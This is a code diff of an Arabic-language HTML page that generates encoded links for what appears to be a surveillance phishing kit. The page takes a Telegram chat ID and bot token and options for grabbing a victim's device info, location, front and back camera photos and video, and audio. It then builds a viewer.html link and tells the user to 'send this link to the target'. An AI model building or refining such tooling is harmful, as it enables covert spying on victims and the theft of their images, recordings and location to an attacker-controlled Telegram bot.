@@ -3,103 +3,72 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>API Controller</title>
+<title>API Generator</title>
 <style>
     body { margin: 0; padding: 0; height: 100vh; background: #fff; display: flex; justify-content: center; align-items: center; font-family: Tahoma, sans-serif; text-align: center; }
     .error { display: none; font-size: 24px; font-weight: bold; color: #ff0000; }
-    .dashboard { display: none; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }
-    .dashboard h2 { color: #333; margin-bottom: 20px; }
-    .input-group { margin-bottom: 15px; text-align: right; }
-    .input-group label { display: block; margin-bottom: 5px; color: #555; font-size: 14px; }
-    .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; direction: ltr; }
-    .checkbox-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; text-align: right; }
-    .checkbox-group label { display: flex; align-items: center; gap: 5px; font-size: 14px; cursor: pointer; }
-    button { width: 100%; padding: 12px; background: #007bff; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-    button:hover { background: #0056b3; }
-    .result { margin-top: 20px; display: none; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #ddd; }
-    .result textarea { width: 100%; height: 80px; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-family: monospace; direction: ltr; resize: none; }
+    .result-box { display: none; background: #f8f9fa; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 600px; border: 1px solid #ddd; }
+    .result-box h2 { color: #333; margin-top: 0; }
+    .result-box textarea { width: 100%; height: 80px; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 6px; direction: ltr; font-family: monospace; resize: none; }
+    .result-box button { margin-top: 10px; padding: 10px 20px; background: #007bff; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
 </style>
 </head>
 <body>
 
-    <div id="error-screen" class="error">خطأ في API key</div>
+<div id="error-screen" class="error">خطأ في API key</div>
 
-    <div id="dashboard" class="dashboard">
-        <h2>لوحة التحكم - توليد الرابط</h2>
-        
-        <div class="input-group">
-            <label>Chat ID:</label>
-            <input type="text" id="tg-id" placeholder="7194730111">
-        </div>
-        <div class="input-group">
-            <label>Bot Token:</label>
-            <input type="text" id="tg-token" placeholder="8995993534:...">
-        </div>
+<div id="result-box" class="result-box">
+    <h2>تم إنشاء الرابط المشفر بنجاح!</h2>
+    <p>أرسل هذا الرابط للهدف:</p>
+    <textarea id="encoded-link" readonly></textarea>
+    <button onclick="copyLink()">نسخ الرابط</button>
+</div>
 
-        <div class="checkbox-group">
-            <label><input type="checkbox" id="chk-inf" checked> معلومات الجهاز (inf)</label>
-            <label><input type="checkbox" id="chk-loc" checked> الموقع (loc)</label>
-            <label><input type="checkbox" id="chk-fc"> كاميرا أمامية (fc)</label>
-            <label><input type="checkbox" id="chk-bc"> كاميرا خلفية (bc)</label>
-            <label><input type="checkbox" id="chk-fcv"> فيديو أمامي (fcv)</label>
-            <label><input type="checkbox" id="chk-bcv"> فيديو خلفي (bcv)</label>
-            <label><input type="checkbox" id="chk-r"> تسجيل صوتي (r)</label>
-        </div>
+<script>
+    // 1. التحقق من مفتاح الـ API
+    const urlParams = new URLSearchParams(window.location.search);
+    const apiKey = urlParams.get('api');
+    
+    // المفتاح السري
+    const SECRET_KEY = "754298";
 
-        <button onclick="generateLink()">توليد الرابط المشفر</button>
+    if (apiKey !== SECRET_KEY) {
+        // لو الرابط مش فيه المفتاح أو غلط -> شاشة بيضاء بخطأ
+        document.getElementById('error-screen').style.display = 'block';
+    } else {
+        // 2. لو المفتاح صح -> نقرأ المميزات ونشفرها
+        document.getElementById('result-box').style.display = 'block';
 
-        <div class="result" id="result-box">
-            <p style="color:green; font-weight:bold; margin-top:0;">الرابط جاهز:</p>
-            <textarea id="output-link" readonly></textarea>
-            <button style="margin-top:10px; background:#28a745;" onclick="copyLink()">نسخ الرابط</button>
-        </div>
-    </div>
+        const config = {
+            id: urlParams.get('id') || '',
+            token: urlParams.get('token') || '',
+            fc: urlParams.has('fc'),
+            bc: urlParams.has('bc'),
+            fcv: urlParams.has('fcv'),
+            bcv: urlParams.has('bcv'),
+            r: urlParams.has('r'),
+            loc: urlParams.has('l'),
+            inf: urlParams.has('inf')
+        };
 
-    <script>
-        // 1. التحقق من مفتاح الـ API
-        const urlParams = new URLSearchParams(window.location.search);
-        const apiKey = urlParams.get('api');
-        
-        if (apiKey === "754298") {
-            document.getElementById('dashboard').style.display = 'block';
-        } else {
-            document.getElementById('error-screen').style.display = 'block';
-        }
+        // تشفير البيانات Base64
+        const jsonStr = JSON.stringify(config);
+        const base64Data = btoa(unescape(encodeURIComponent(jsonStr)));
 
-        // 2. توليد الرابط
-        function generateLink() {
-            const id = document.getElementById('tg-id').value.trim();
-            const token = document.getElementById('tg-token').value.trim();
-            if (!id || !token) { alert("يرجى ملء الـ ID والتوكن!"); return; }
+        // رابط صفحة التحميل (viewer.html)
+        const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
+        const finalLink = baseUrl + "viewer.html?data=" + encodeURIComponent(base64Data);
 
-            const config = {
-                id: id, token: token,
-                inf: document.getElementById('chk-inf').checked,
-                loc: document.getElementById('chk-loc').checked,
-                fc: document.getElementById('chk-fc').checked,
-                bc: document.getElementById('chk-bc').checked,
-                fcv: document.getElementById('chk-fcv').checked,
-                bcv: document.getElementById('chk-bcv').checked,
-                r: document.getElementById('chk-r').checked
-            };
+        // عرض الرابط للمستخدم
+        document.getElementById('encoded-link').value = finalLink;
+    }
 
-            const jsonStr = JSON.stringify(config);
-            const base64Data = btoa(unescape(encodeURIComponent(jsonStr)));
-
-            // بيبني الرابط على نفس الدومين بتاعك ويفتح viewer.html
-            const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
-            const finalLink = baseUrl + "viewer.html?data=" + encodeURIComponent(base64Data);
-
-            document.getElementById('output-link').value = finalLink;
-            document.getElementById('result-box').style.display = 'block';
-        }
-
-        function copyLink() {
-            const copyText = document.getElementById('output-link');
-            copyText.select();
-            document.execCommand("copy");
-            alert("تم النسخ!");
-        }
-    </script>
+    function copyLink() {
+        const copyText = document.getElementById('encoded-link');
+        copyText.select();
+        document.execCommand("copy");
+        alert("تم نسخ الرابط!");
+    }
+</script>
 </body>
 </html>
